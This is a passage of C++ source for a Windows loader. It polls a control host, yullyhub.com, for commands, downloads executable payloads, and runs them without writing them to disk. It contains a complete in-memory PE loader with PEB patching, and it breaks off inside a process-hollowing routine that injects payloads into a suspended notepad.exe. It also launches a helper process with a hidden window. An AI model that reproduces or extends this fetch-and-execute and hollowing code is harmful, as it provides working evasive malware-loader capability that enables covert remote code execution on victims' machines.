#define WIN32_LEAN_AND_MEAN
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <bcrypt.h>
#include <shellapi.h>
#include <rpc.h>
#include <winhttp.h>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <iostream>
#include <random>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <intrin.h>
#include <winternl.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "bcrypt.lib")

// Default control-plane host. Overridable at runtime via YULLY_HOST env.
// Vercel serverless can't hold a WebSocket so we poll HTTPS instead.
static const char* DEFAULT_API_HOST = "yullyhub.com";
static bool  g_api_https = true;
static std::string g_api_host = DEFAULT_API_HOST;
static int   g_api_port = 443;
static std::string g_loader_id;   // random UUID picked at startup

// Legacy — only used if YULLY_HOST is missing and we fall back to WS on
// localhost for local dev.
static const char* SERVER_HOST = "127.0.0.1";
static const char* SERVER_PORT = "3000";
static const char* WS_PATH = "/ws";

/* ========== base64 ========== */
static std::string b64_encode(const unsigned char* data, size_t len) {
    static const char* tbl =
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string out;
    for (size_t i = 0; i < len; i += 3) {
        unsigned v = data[i] << 16;
        if (i + 1 < len) v |= data[i + 1] << 8;
        if (i + 2 < len) v |= data[i + 2];
        out += tbl[(v >> 18) & 63];
        out += tbl[(v >> 12) & 63];
        out += (i + 1 < len) ? tbl[(v >> 6) & 63] : '=';
        out += (i + 2 < len) ? tbl[v & 63]        : '=';
    }
    return out;
}

/* ========== SHA1 via bcrypt ========== */
static std::string sha1_b64(const std::string& in) {
    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_HASH_HANDLE hHash = nullptr;
    unsigned char digest[20] = {0};
    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA1_ALGORITHM, nullptr, 0) == 0) {
        if (BCryptCreateHash(hAlg, &hHash, nullptr, 0, nullptr, 0, 0) == 0) {
            BCryptHashData(hHash, (PUCHAR)in.data(), (ULONG)in.size(), 0);
            BCryptFinishHash(hHash, digest, 20, 0);
            BCryptDestroyHash(hHash);
        }
        BCryptCloseAlgorithmProvider(hAlg, 0);
    }
    return b64_encode(digest, 20);
}

/* ========== random ========== */
static std::string gen_ws_key() {
    unsigned char raw[16];
    std::random_device rd;
    for (int i = 0; i < 16; ++i) raw[i] = (unsigned char)(rd() & 0xFF);
    return b64_encode(raw, 16);
}

/* ========== socket helpers ========== */
static bool send_all(SOCKET s, const char* data, int len) {
    int sent = 0;
    while (sent < len) {
        int r = send(s, data + sent, len - sent, 0);
        if (r <= 0) return false;
        sent += r;
    }
    return true;
}

static bool recv_all(SOCKET s, char* buf, int len) {
    int got = 0;
    while (got < len) {
        int r = recv(s, buf + got, len - got, 0);
        if (r <= 0) return false;
        got += r;
    }
    return true;
}

static std::string recv_http_headers(SOCKET s) {
    std::string buf;
    char c;
    while (buf.size() < 8192) {
        int r = recv(s, &c, 1, 0);
        if (r <= 0) return "";
        buf += c;
        if (buf.size() >= 4 &&
            buf.compare(buf.size() - 4, 4, "\r\n\r\n") == 0) break;
    }
    return buf;
}

/* ========== WebSocket frames ========== */
struct Frame { int opcode; std::string payload; bool ok; };

static Frame recv_frame(SOCKET s) {
    Frame f{0, "", false};
    unsigned char hdr[2];
    if (!recv_all(s, (char*)hdr, 2)) return f;
    f.opcode = hdr[0] & 0x0F;
    bool masked = (hdr[1] & 0x80) != 0;
    uint64_t len = hdr[1] & 0x7F;
    if (len == 126) {
        unsigned char ext[2];
        if (!recv_all(s, (char*)ext, 2)) return f;
        len = ((uint64_t)ext[0] << 8) | ext[1];
    } else if (len == 127) {
        unsigned char ext[8];
        if (!recv_all(s, (char*)ext, 8)) return f;
        len = 0;
        for (int i = 0; i < 8; ++i) len = (len << 8) | ext[i];
    }
    unsigned char mask[4] = {0};
    if (masked && !recv_all(s, (char*)mask, 4)) return f;
    if (len > 0) {
        f.payload.resize((size_t)len);
        if (!recv_all(s, f.payload.data(), (int)len)) return f;
        if (masked) {
            for (size_t i = 0; i < len; ++i) f.payload[i] ^= mask[i % 4];
        }
    }
    f.ok = true;
    return f;
}

static bool send_text(SOCKET s, const std::string& payload) {
    std::string frame;
    frame += (char)0x81;
    size_t len = payload.size();
    unsigned char mask[4];
    std::random_device rd;
    for (int i = 0; i < 4; ++i) mask[i] = (unsigned char)(rd() & 0xFF);
    if (len <= 125) {
        frame += (char)(0x80 | len);
    } else if (len <= 0xFFFF) {
        frame += (char)(0x80 | 126);
        frame += (char)((len >> 8) & 0xFF);
        frame += (char)(len & 0xFF);
    } else {
        frame += (char)(0x80 | 127);
        for (int i = 7; i >= 0; --i) frame += (char)((len >> (i * 8)) & 0xFF);
    }
    frame.append((char*)mask, 4);
    std::string masked(payload);
    for (size_t i = 0; i < len; ++i) masked[i] ^= mask[i % 4];
    frame += masked;
    return send_all(s, frame.data(), (int)frame.size());
}

/* ========== JSON string extractor ========== */
static std::string extract_str(const std::string& json, const std::string& key) {
    std::string needle = "\"" + key + "\"";
    size_t p = json.find(needle);
    if (p == std::string::npos) return "";
    p = json.find(':', p);
    if (p == std::string::npos) return "";
    p = json.find('"', p);
    if (p == std::string::npos) return "";
    size_t end = json.find('"', p + 1);
    if (end == std::string::npos) return "";
    return json.substr(p + 1, end - p - 1);
}

/* ========== URL parser (http:// only) ========== */
static bool parse_http_url(const std::string& url, std::string& host, int& port, std::string& path) {
    if (url.compare(0, 7, "http://") != 0) return false;
    size_t start = 7;
    size_t slash = url.find('/', start);
    std::string authority = url.substr(start, slash == std::string::npos ? std::string::npos : slash - start);
    path = (slash == std::string::npos) ? "/" : url.substr(slash);
    size_t colon = authority.find(':');
    if (colon == std::string::npos) {
        host = authority;
        port = 80;
    } else {
        host = authority.substr(0, colon);
        try { port = std::stoi(authority.substr(colon + 1)); } catch (...) { return false; }
    }
    return true;
}

/* ========== chunked decoder ========== */
static std::vector<unsigned char> decode_chunked_bytes(const unsigned char* body, size_t len) {
    std::vector<unsigned char> out;
    size_t p = 0;
    while (p < len) {
        size_t end = p;
        while (end + 1 < len && !(body[end] == '\r' && body[end + 1] == '\n')) end++;
        if (end + 1 >= len) break;
        std::string sizeStr((const char*)body + p, end - p);
        size_t semi = sizeStr.find(';');
        if (semi != std::string::npos) sizeStr = sizeStr.substr(0, semi);
        size_t sz = 0;
        try { sz = std::stoul(sizeStr, nullptr, 16); } catch (...) { break; }
        p = end + 2;
        if (sz == 0) break;
        if (p + sz > len) break;
        out.insert(out.end(), body + p, body + p + sz);
        p += sz + 2;
    }
    return out;
}

/* ========== HTTP download to memory ========== */
// Forward-decl — the WinHTTP helper lives below this function.
static bool wh_get_bytes(const std::string& host, int port, bool https,
                         const std::string& path,
                         std::vector<unsigned char>& out);

static bool http_download_bytes(const std::string& url, std::vector<unsigned char>& outBytes) {
    // HTTPS routes through WinHTTP so we can talk to Vercel / the public
    // domain. Plain HTTP keeps using the raw-socket path so behaviour on
    // localhost during dev is unchanged.
    if (url.compare(0, 8, "https://") == 0) {
        std::string s = url.substr(8);
        size_t slash = s.find('/');
        std::string authority = (slash == std::string::npos) ? s : s.substr(0, slash);
        std::string path = (slash == std::string::npos) ? "/" : s.substr(slash);
        std::string host = authority;
        int port = 443;
        size_t colon = authority.find(':');
        if (colon != std::string::npos) {
            host = authority.substr(0, colon);
            try { port = std::stoi(authority.substr(colon + 1)); } catch (...) {}
        }
        return wh_get_bytes(host, port, true, path, outBytes);
    }

    std::string host, path;
    int port;
    if (!parse_http_url(url, host, port, path)) {
        std::cerr << "[loader] bad url: " << url << std::endl;
        return false;
    }

    addrinfo hints{}, *res = nullptr;
    hints.ai_family = AF_INET;
    hints.ai_socktype = SOCK_STREAM;
    std::string portStr = std::to_string(port);
    if (getaddrinfo(host.c_str(), portStr.c_str(), &hints, &res) != 0) return false;

    SOCKET s = socket(res->ai_family, res->ai_socktype, res->ai_protocol);
    if (s == INVALID_SOCKET) { freeaddrinfo(res); return false; }
    if (connect(s, res->ai_addr, (int)res->ai_addrlen) != 0) {
        closesocket(s); freeaddrinfo(res); return false;
    }
    freeaddrinfo(res);

    std::string req =
        "GET " + path + " HTTP/1.1\r\n"
        "Host: " + host + ":" + portStr + "\r\n"
        "User-Agent: WebLoader/1.0\r\n"
        "Accept: */*\r\n"
        "Connection: close\r\n\r\n";
    if (!send_all(s, req.data(), (int)req.size())) { closesocket(s); return false; }

    std::vector<unsigned char> buf;
    unsigned char tmp[8192];
    while (true) {
        int r = recv(s, (char*)tmp, sizeof(tmp), 0);
        if (r <= 0) break;
        buf.insert(buf.end(), tmp, tmp + r);
    }
    closesocket(s);

    // find header end
    size_t hdrEnd = std::string::npos;
    for (size_t i = 0; i + 3 < buf.size(); ++i) {
        if (buf[i] == '\r' && buf[i+1] == '\n' && buf[i+2] == '\r' && buf[i+3] == '\n') {
            hdrEnd = i; break;
        }
    }
    if (hdrEnd == std::string::npos) return false;

    std::string headers((const char*)buf.data(), hdrEnd);
    const unsigned char* body = buf.data() + hdrEnd + 4;
    size_t bodyLen = buf.size() - hdrEnd - 4;

    if (headers.find(" 200 ") == std::string::npos && headers.find(" 200\r\n") == std::string::npos) {
        std::cerr << "[loader] http not 200: " << headers.substr(0, headers.find("\r\n")) << std::endl;
        return false;
    }

    std::string lowered = headers;
    for (auto& c : lowered) c = (char)std::tolower(c);
    if (lowered.find("transfer-encoding: chunked") != std::string::npos) {
        outBytes = decode_chunked_bytes(body, bodyLen);
    } else {
        outBytes.assign(body, body + bodyLen);
    }
    return true;
}

// ========================================================================
//  WinHTTP-based HTTPS helpers — used for the polling control plane and
//  for downloads from the Vercel domain (yullyhub.com). Raw sockets only
//  do plain HTTP; anything TLS goes through here.
// ========================================================================
static std::wstring toW(const std::string& s) {
    if (s.empty()) return L"";
    int n = MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), nullptr, 0);
    std::wstring w(n, L'\0');
    MultiByteToWideChar(CP_UTF8, 0, s.c_str(), (int)s.size(), &w[0], n);
    return w;
}

static bool wh_request(const std::wstring& host, int port, bool https,
                       const std::wstring& method, const std::wstring& path,
                       const std::string& body, std::vector<unsigned char>& outBytes,
                       long* outStatus = nullptr) {
    HINTERNET hSess = WinHttpOpen(L"YullyLoader/1.0",
        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSess) return false;

    HINTERNET hCon = WinHttpConnect(hSess, host.c_str(), (INTERNET_PORT)port, 0);
    if (!hCon) { WinHttpCloseHandle(hSess); return false; }

    DWORD flags = https ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hReq = WinHttpOpenRequest(hCon, method.c_str(), path.c_str(),
        nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, flags);
    if (!hReq) { WinHttpCloseHandle(hCon); WinHttpCloseHandle(hSess); return false; }

    std::wstring headers;
    if (!body.empty()) headers = L"Content-Type: application/json\r\n";

    bool ok = WinHttpSendRequest(hReq,
        headers.empty() ? WINHTTP_NO_ADDITIONAL_HEADERS : headers.c_str(),
        (DWORD)headers.size(),
        body.empty() ? WINHTTP_NO_REQUEST_DATA : (LPVOID)body.data(),
        (DWORD)body.size(), (DWORD)body.size(), 0)
     && WinHttpReceiveResponse(hReq, nullptr);

    if (ok) {
        DWORD sc = 0, sz = sizeof(sc);
        WinHttpQueryHeaders(hReq, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
            WINHTTP_HEADER_NAME_BY_INDEX, &sc, &sz, WINHTTP_NO_HEADER_INDEX);
        if (outStatus) *outStatus = (long)sc;
        for (;;) {
            DWORD avail = 0;
            if (!WinHttpQueryDataAvailable(hReq, &avail) || avail == 0) break;
            size_t off = outBytes.size();
            outBytes.resize(off + avail);
            DWORD read = 0;
            if (!WinHttpReadData(hReq, outBytes.data() + off, avail, &read) || read == 0) break;
            outBytes.resize(off + read);
        }
    }
    WinHttpCloseHandle(hReq);
    WinHttpCloseHandle(hCon);
    WinHttpCloseHandle(hSess);
    return ok;
}

static bool wh_get_string(const std::string& host, int port, bool https,
                          const std::string& path, std::string& outText,
                          long* outStatus = nullptr) {
    std::vector<unsigned char> buf;
    if (!wh_request(toW(host), port, https, L"GET", toW(path), "", buf, outStatus)) return false;
    outText.assign((char*)buf.data(), buf.size());
    return true;
}

static bool wh_post_json(const std::string& host, int port, bool https,
                         const std::string& path, const std::string& body,
                         std::string& outText, long* outStatus = nullptr) {
    std::vector<unsigned char> buf;
    if (!wh_request(toW(host), port, https, L"POST", toW(path), body, buf, outStatus)) return false;
    outText.assign((char*)buf.data(), buf.size());
    return true;
}

static bool wh_get_bytes(const std::string& host, int port, bool https,
                         const std::string& path,
                         std::vector<unsigned char>& out) {
    long sc = 0;
    if (!wh_request(toW(host), port, https, L"GET", toW(path), "", out, &sc)) return false;
    return sc == 200;
}

// Naive JSON walker — pulls out each top-level object inside an array
// under `key`. Only used for the polling response's "commands" field.
static std::vector<std::string> extract_object_array(const std::string& json, const std::string& key) {
    std::vector<std::string> out;
    std::string needle = "\"" + key + "\"";
    size_t p = json.find(needle);
    if (p == std::string::npos) return out;
    p = json.find('[', p);
    if (p == std::string::npos) return out;
    p++;
    while (p < json.size()) {
        while (p < json.size() && (json[p]==' '||json[p]==','||json[p]=='\n'||json[p]=='\t'||json[p]=='\r')) p++;
        if (p >= json.size() || json[p] == ']') break;
        if (json[p] != '{') break;
        size_t start = p;
        int depth = 0;
        bool inStr = false, esc = false;
        while (p < json.size()) {
            char c = json[p];
            if (esc) { esc = false; p++; continue; }
            if (c == '\\') { esc = true; p++; continue; }
            if (c == '"') { inStr = !inStr; p++; continue; }
            if (!inStr) {
                if (c == '{') depth++;
                else if (c == '}') { depth--; if (depth == 0) { p++; break; } }
            }
            p++;
        }
        out.push_back(json.substr(start, p - start));
    }
    return out;
}

// Read YULLY_HOST env, split scheme + host, populate g_api_host/g_api_port/g_api_https.
static void configure_from_env() {
    char buf[512];
    DWORD n = GetEnvironmentVariableA("YULLY_HOST", buf, (DWORD)sizeof(buf));
    std::string s = (n > 0 && n < sizeof(buf)) ? std::string(buf, n) : std::string(DEFAULT_API_HOST);
    // strip scheme
    if (s.rfind("https://", 0) == 0) { g_api_https = true;  s = s.substr(8); g_api_port = 443; }
    else if (s.rfind("http://", 0) == 0) { g_api_https = false; s = s.substr(7); g_api_port = 80; }
    else { g_api_https = true; g_api_port = 443; }
    size_t slash = s.find('/');
    if (slash != std::string::npos) s = s.substr(0, slash);
    size_t colon = s.find(':');
    if (colon != std::string::npos) {
        g_api_host = s.substr(0, colon);
        try { g_api_port = std::stoi(s.substr(colon + 1)); } catch (...) {}
    } else {
        g_api_host = s;
    }
    // A random-ish loader id — plain hex, no dashes.
    UUID id; UuidCreate(&id);
    char* str = nullptr;
    UuidToStringA(&id, (RPC_CSTR*)&str);
    if (str) { g_loader_id = str; RpcStringFreeA((RPC_CSTR*)&str); }
    else     { g_loader_id = std::to_string(GetTickCount()); }
}

/* ==========================================================
 *  IN-MEMORY PE LOADER  ("MemoryModule" style)
 *  Maps a PE image into RAM, resolves imports, applies relocs,
 *  sets section protections, calls TLS callbacks, invokes entry.
 *  Runs the payload in a fresh thread inside THIS process — no
 *  disk write, no CreateProcess, no dropped file.
 * ========================================================== */

typedef struct _MEM_MODULE {
    PIMAGE_NT_HEADERS       ntHeaders;
    HMODULE*                modules;
    int                     numModules;
    unsigned char*          base;
    bool                    initialized;
    DWORD                   sizeOfImage;
    std::string             title;
} MEM_MODULE, *PMEM_MODULE;

static void mem_free(PMEM_MODULE m) {
    if (!m) return;
    if (m->modules) {
        for (int i = 0; i < m->numModules; ++i)
            if (m->modules[i] && m->modules[i] != INVALID_HANDLE_VALUE)
                FreeLibrary(m->modules[i]);
        free(m->modules);
    }
    if (m->base) VirtualFree(m->base, 0, MEM_RELEASE);
    delete m;
}

static bool copy_sections(unsigned char* image, const unsigned char* data,
                          PIMAGE_NT_HEADERS nt) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->SizeOfRawData == 0) {
            DWORD sz = nt->OptionalHeader.SectionAlignment;
            if (sz > 0) {
                unsigned char* dst = image + sec->VirtualAddress;
                memset(dst, 0, sz);
            }
            continue;
        }
        unsigned char* dst = image + sec->VirtualAddress;
        memcpy(dst, data + sec->PointerToRawData, sec->SizeOfRawData);
    }
    return true;
}

static void perform_relocations(unsigned char* image, PIMAGE_NT_HEADERS nt,
                                 ptrdiff_t delta) {
    IMAGE_DATA_DIRECTORY* rel =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (rel->Size == 0 || delta == 0) return;

    PIMAGE_BASE_RELOCATION br =
        (PIMAGE_BASE_RELOCATION)(image + rel->VirtualAddress);
    while (br->VirtualAddress) {
        DWORD cnt = (br->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
        WORD* list = (WORD*)((unsigned char*)br + sizeof(IMAGE_BASE_RELOCATION));
        unsigned char* dest = image + br->VirtualAddress;
        for (DWORD i = 0; i < cnt; ++i) {
            int type = list[i] >> 12;
            int off  = list[i] & 0xFFF;
            if (type == IMAGE_REL_BASED_ABSOLUTE) continue;
            if (type == IMAGE_REL_BASED_HIGHLOW) {
                DWORD* patch = (DWORD*)(dest + off);
                *patch += (DWORD)delta;
            } else if (type == IMAGE_REL_BASED_DIR64) {
                ULONGLONG* patch = (ULONGLONG*)(dest + off);
                *patch += (ULONGLONG)delta;
            }
        }
        br = (PIMAGE_BASE_RELOCATION)((unsigned char*)br + br->SizeOfBlock);
    }
}

static std::string g_lastErr;

static bool resolve_imports(PMEM_MODULE m) {
    unsigned char* image = m->base;
    PIMAGE_NT_HEADERS nt = m->ntHeaders;
    IMAGE_DATA_DIRECTORY* imp =
        &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
    if (imp->Size == 0) return true;

    PIMAGE_IMPORT_DESCRIPTOR desc =
        (PIMAGE_IMPORT_DESCRIPTOR)(image + imp->VirtualAddress);

    int allocated = 32;
    m->modules = (HMODULE*)calloc(allocated, sizeof(HMODULE));
    m->numModules = 0;

    while (desc->Name) {
        const char* dllName = (const char*)(image + desc->Name);
        HMODULE h = LoadLibraryA(dllName);
        if (!h) {
            g_lastErr = std::string("LoadLibrary failed for: ") + dllName +
                        "\n\nThis payload needs a DLL that isn't installed "
                        "system-wide. Bundle-style apps (Telegram, Discord, "
                        "browsers) can't run in-memory because their DLLs live "
                        "next to the .exe on disk. Use single-file exes.";
            return false;
        }
        if (m->numModules >= allocated) {
            allocated *= 2;
            m->modules = (HMODULE*)realloc(m->modules, allocated * sizeof(HMODULE));
        }
        m->modules[m->numModules++] = h;

        uintptr_t* thunkRef;
        FARPROC*  funcRef;
        if (desc->OriginalFirstThunk) {
            thunkRef = (uintptr_t*)(image + desc->OriginalFirstThunk);
            funcRef  = (FARPROC*)(image + desc->FirstThunk);
        } else {
            thunkRef = (uintptr_t*)(image + desc->FirstThunk);
            funcRef  = (FARPROC*)(image + desc->FirstThunk);
        }

        for (; *thunkRef; ++thunkRef, ++funcRef) {
            if (IMAGE_SNAP_BY_ORDINAL(*thunkRef)) {
                *funcRef = GetProcAddress(h, (LPCSTR)IMAGE_ORDINAL(*thunkRef));
            } else {
                PIMAGE_IMPORT_BY_NAME byName =
                    (PIMAGE_IMPORT_BY_NAME)(image + *thunkRef);
                *funcRef = GetProcAddress(h, (LPCSTR)&byName->Name);
            }
            if (!*funcRef) {
                g_lastErr = std::string("GetProcAddress failed in ") + dllName;
                return false;
            }
        }
        ++desc;
    }
    return true;
}

static DWORD section_protection_flags(DWORD chars) {
    bool exec  = (chars & IMAGE_SCN_MEM_EXECUTE) != 0;
    bool read  = (chars & IMAGE_SCN_MEM_READ)    != 0;
    bool write = (chars & IMAGE_SCN_MEM_WRITE)   != 0;
    if (exec && read && write) return PAGE_EXECUTE_READWRITE;
    if (exec && read)          return PAGE_EXECUTE_READ;
    if (exec && write)         return PAGE_EXECUTE_READWRITE;
    if (exec)                  return PAGE_EXECUTE;
    if (read && write)         return PAGE_READWRITE;
    if (read)                  return PAGE_READONLY;
    if (write)                 return PAGE_READWRITE;
    return PAGE_NOACCESS;
}

static void finalize_sections(PMEM_MODULE m) {
    PIMAGE_SECTION_HEADER sec = IMAGE_FIRST_SECTION(m->ntHeaders);
    for (WORD i = 0; i < m->ntHeaders->FileHeader.NumberOfSections; ++i, ++sec) {
        if (sec->Misc.VirtualSize == 0 && sec->SizeOfRawData == 0) continue;
        if (sec->Characteristics & IMAGE_SCN_MEM_DISCARDABLE) continue;
        DWORD prot = section_protection_flags(sec->Characteristics);
        DWORD old;
        DWORD sz = sec->Misc.VirtualSize;
        if (sz == 0) sz = sec->SizeOfRawData;
        VirtualProtect(m->base + sec->VirtualAddress, sz, prot, &old);
    }
}

static void execute_tls(PMEM_MODULE m) {
    IMAGE_DATA_DIRECTORY* dir =
        &m->ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
    if (dir->Size == 0) return;
    PIMAGE_TLS_DIRECTORY tls = (PIMAGE_TLS_DIRECTORY)(m->base + dir->VirtualAddress);
    PIMAGE_TLS_CALLBACK* cb = (PIMAGE_TLS_CALLBACK*)tls->AddressOfCallBacks;
    if (cb) {
        while (*cb) {
            (*cb)((LPVOID)m->base, DLL_PROCESS_ATTACH, NULL);
            ++cb;
        }
    }
}

typedef int (WINAPI *EXEENTRY)(void);

static bool memload_prepare(const std::vector<unsigned char>& data, PMEM_MODULE& outM) {
    outM = nullptr;
    g_lastErr.clear();

    if (data.size() < sizeof(IMAGE_DOS_HEADER)) {
        g_lastErr = "payload too small for a PE header";
        return false;
    }
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        g_lastErr = "bad DOS signature (not a PE file)";
        return false;
    }
    if ((size_t)dos->e_lfanew + sizeof(IMAGE_NT_HEADERS) > data.size()) {
        g_lastErr = "NT header offset out of range (truncated payload?)";
        return false;
    }

    PIMAGE_NT_HEADERS srcNt = (PIMAGE_NT_HEADERS)(data.data() + dos->e_lfanew);
    if (srcNt->Signature != IMAGE_NT_SIGNATURE) {
        g_lastErr = "bad NT signature";
        return false;
    }

#ifdef _WIN64
    if (srcNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        g_lastErr = "payload is not x64 (loader is x64-only). "
                    "Rebuild the payload as 64-bit.";
        return false;
    }
#else
    if (srcNt->FileHeader.Machine != IMAGE_FILE_MACHINE_I386) {
        g_lastErr = "payload is not x86 (loader was built as x86)";
        return false;
    }
#endif

    DWORD imgSize = srcNt->OptionalHeader.SizeOfImage;
    ULONGLONG preferred = srcNt->OptionalHeader.ImageBase;

    unsigned char* image = (unsigned char*)VirtualAlloc(
        (LPVOID)preferred, imgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (!image) {
        image = (unsigned char*)VirtualAlloc(
            NULL, imgSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    }
    if (!image) {
        g_lastErr = "VirtualAlloc failed (out of address space?)";
        return false;
    }

    memcpy(image, data.data(), srcNt->OptionalHeader.SizeOfHeaders);
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(image + dos->e_lfanew);
    nt->OptionalHeader.ImageBase = (ULONGLONG)(uintptr_t)image;

    if (!copy_sections(image, data.data(), srcNt)) {
        VirtualFree(image, 0, MEM_RELEASE);
        return false;
    }

    ptrdiff_t delta = (ptrdiff_t)((uintptr_t)image - (uintptr_t)preferred);
    perform_relocations(image, nt, delta);

    PMEM_MODULE m = new MEM_MODULE{};
    m->base = image;
    m->ntHeaders = nt;
    m->sizeOfImage = imgSize;

    if (!resolve_imports(m)) {
        mem_free(m);
        return false;
    }

    finalize_sections(m);
    execute_tls(m);

    // Register the payload's x64 exception directory so unwinding works.
    // Without this, ANY C++ throw / SEH __try / CRT-init exception during
    // startup will hit the OS's "no handler found" path and ExitProcess
    // silently.
#ifdef _WIN64
    {
        IMAGE_DATA_DIRECTORY* exc =
            &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
        if (exc->Size > 0) {
            PRUNTIME_FUNCTION funcs = (PRUNTIME_FUNCTION)(image + exc->VirtualAddress);
            DWORD count = exc->Size / sizeof(RUNTIME_FUNCTION);
            if (RtlAddFunctionTable(funcs, count, (DWORD64)image)) {
                std::cout << "[loader] mem: registered "
                          << count << " RUNTIME_FUNCTION entries for SEH" << std::endl;
            }
        }
    }
#endif

    // Overwrite PEB.ImageBaseAddress in the CURRENT (child) process so that
    // GetModuleHandle(NULL), FindResource, RegisterClass, GetModuleFileName
    // etc. all see the payload's mapped image — not loader.exe. GUI apps
    // that pass hInstance=GetModuleHandle(NULL) to RegisterClassEx would
    // otherwise fail on class registration and silently ExitProcess.
#ifdef _WIN64
    {
        // TEB->PEB pointer sits at GS:[0x60] on x64.
        // PEB->ImageBaseAddress sits at PEB+0x10.
        BYTE* peb = (BYTE*)__readgsqword(0x60);
        *(ULONG_PTR*)(peb + 0x10) = (ULONG_PTR)image;
        std::cout << "[loader] mem: patched PEB.ImageBaseAddress -> "
                  << (void*)image << std::endl;
    }
#endif

    m->initialized = true;

    outM = m;
    return true;
}

// Calls the payload's entry point on the CURRENT thread. Never returns cleanly
// for GUI apps (they run their own message loop then ExitProcess); for console
// apps it returns whatever main() returned. Either way — this is invoked in
// the CHILD process, so an ExitProcess kills only the child.
static int memload_execute(PMEM_MODULE m) {
    unsigned char* entry = m->base + m->ntHeaders->OptionalHeader.AddressOfEntryPoint;
    EXEENTRY fn = (EXEENTRY)entry;
    int rc = 0;
#ifdef _MSC_VER
    __try {
        rc = fn();
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        std::cerr << "[loader-child] payload exception 0x" << std::hex << GetExceptionCode() << std::endl;
        rc = 1;
    }
#else
    rc = fn();
#endif
    return rc;
}

/* ========== Auto-spawn the Dynamic Island electron overlay ==========
 *  The island lives at ../DynamicIsland relative to loader.exe. Loader
 *  owns its lifecycle — starts it on boot, and it dies when the loader
 *  process tree goes away (or you kill it manually).
 * ============================================================ */
static void spawn_island_overlay() {
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) return;
    std::string p(selfPath);
    size_t s1 = p.find_last_of("\\/");
    if (s1 == std::string::npos) return;
    std::string loaderDir = p.substr(0, s1);
    size_t s2 = loaderDir.find_last_of("\\/");
    if (s2 == std::string::npos) return;
    std::string root = loaderDir.substr(0, s2);
    std::string islandDir = root + "\\DynamicIsland";

    DWORD attr = GetFileAttributesA(islandDir.c_str());
    if (attr == INVALID_FILE_ATTRIBUTES || !(attr & FILE_ATTRIBUTE_DIRECTORY)) {
        std::cerr << "[loader] no DynamicIsland dir at " << islandDir << " — skipping overlay" << std::endl;
        return;
    }

    // cmd.exe /c so paths with spaces and cwd changes work reliably.
    // Log electron output to %TEMP%\yully-island.log for post-mortem debugging.
    std::string cmd = std::string("cmd.exe /c cd /d \"") + islandDir +
                      "\" && npx --no-install electron . 1>\"%TEMP%\\yully-island.log\" 2>&1";

    STARTUPINFOA si{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi{};
    BOOL ok = CreateProcessA(NULL, cmd.data(), NULL, NULL, FALSE,
                             CREATE_NO_WINDOW,
                             NULL, NULL, &si, &pi);
    if (!ok) {
        std::cerr << "[loader] island spawn failed: " << GetLastError() << std::endl;
        return;
    }
    std::cout << "[loader] launched island overlay (pid=" << pi.dwProcessId << ")" << std::endl;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

/* ============================================================
 *  PROCESS HOLLOWING
 *  Spawn a suspended notepad.exe, unmap its image, alloc our payload
 *  at the payload's preferred base, apply relocs, resolve imports
 *  (kernel32/user32 are at the same VA in every process on the same
 *  boot, so we can resolve locally + WriteProcessMemory the IAT),
 *  patch PEB.ImageBaseAddress in the child, rewrite the suspended
 *  thread's Rcx to our entry, and ResumeThread. The result: our
 *  payload runs in a real Windows process with a proper PEB. Only
 *  the hollowed host dies when the payload ExitProcesses — the
 *  loader keeps running.
 * ============================================================ */

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE, PVOID);
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE, ULONG, PVOID, ULONG, PULONG);

static bool hollow_run(const std::vector<unsigned char>& data, const std::string& title) {
    g_lastErr.clear();

    if (data.size() < sizeof(IMAGE_DOS_HEADER)) { g_lastErr = "payload too small"; return false; }
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)data.data();
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) { g_lastErr = "bad DOS sig"; return false; }
    PIMAGE_NT_HEADERS srcNt = (PIMAGE_NT_HEADERS)(data.data() + dos->e_lfanew);
    if (srcNt->Signature != IMAGE_NT_SIGNATURE) { g_lastErr = "bad NT sig"; return false; }

#ifdef _WIN64
    if (srcNt->FileHeader.Machine != IMAGE_FILE_MACHINE_AMD64) {
        g_lastErr = "payload is not x64 (loader is x64-only)";
        return false;
    }
#endif

